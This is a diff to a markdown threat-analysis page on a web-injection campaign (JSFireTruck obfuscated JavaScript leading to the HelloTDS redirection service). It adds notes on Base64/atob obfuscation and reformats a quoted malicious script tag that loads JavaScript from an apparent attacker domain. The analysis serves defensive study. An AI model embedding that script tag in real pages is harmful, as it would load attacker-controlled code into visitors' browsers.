@@ -10,7 +10,6 @@ next: false
 
 # The Anatomy of a Coordinated Web Attack: From Compromise to Payload
 
-
 ## Introduction: The Multi-Layered Web Threat
 
 Modern web attacks are not singular events but complex, chained operations where legitimate websites are increasingly exploited as vectors for widespread attacks. A recently discovered large-scale campaign involves compromising websites by injecting obfuscated JavaScript code. Threat actors typically use such campaigns to invisibly redirect victims from legitimate sites to malicious pages serving malware, exploits, and spam.
@@ -25,7 +24,6 @@ This presentation dissects this prevalent, large-scale, and coordinated attack m
 
 **Scale of the Threat:**
 A key statistic underscores the campaign's reach: **Over 269,000 web pages were infected with JSFireTruck** between March 26 and April 25, 2025, with a peak of over 50,000 infected pages on April 12 alone.
-
 
 ## Stage 1: Initial Compromise - Gaining a Foothold
 
@@ -104,6 +102,9 @@ Depending on the referring search engine, the script may dynamically create and 
 ![Figure 5. Logic flow: If the referral is not from a search engine, the script may use code from a URL.](/cs_cs/figure5.png)  
 **Figure 5.** Logic flow: If the referral is not from a search engine, the script may use code from a URL.
 
+The obfuscated or dynamically generated code using the `atob()` js function and string concatenation that decodes a string of data that has been encoded using Base64 encoding.
+
+This is used to make it harder to read in the source which delays final URL until runtime to avoid filters and detectors.
 
 ![Figure 6. After redirection, the iframe displays content spoofing a hosting service, leading to a suspicious ZIP archive.](/cs_cs/figure6.png)  
 **Figure 6.** After redirection, the iframe displays content spoofing a hosting service, leading to a suspicious ZIP archive.
@@ -113,11 +114,13 @@ Depending on the referring search engine, the script may dynamically create and 
 If this initial filtering stage doesn't immediately lead to malware, exploits, or malvertising, it serves as a crucial hand-off point to a more sophisticated filtering mechanism: a TDS. An embedded `<script>` element often initiates this request to the TDS, like HelloTDS:
 
 ```html
-<script data-cfasync='false' async type='text/javascript' src='//yr.unasonoric.com/tMwxtsZeFANq/108477'></script>
+<script data-cfasync='false' 
+	async type='text/javascript' 
+	src='//yr.unasonoric.com/tMwxtsZeFANq/108477'>
+</script>
 ```
 
 *Embedded script making the initial HelloTDS request.*
-
 
 ## Stage 4: HelloTDS - Advanced Fingerprinting, Evasion & Redirection
 
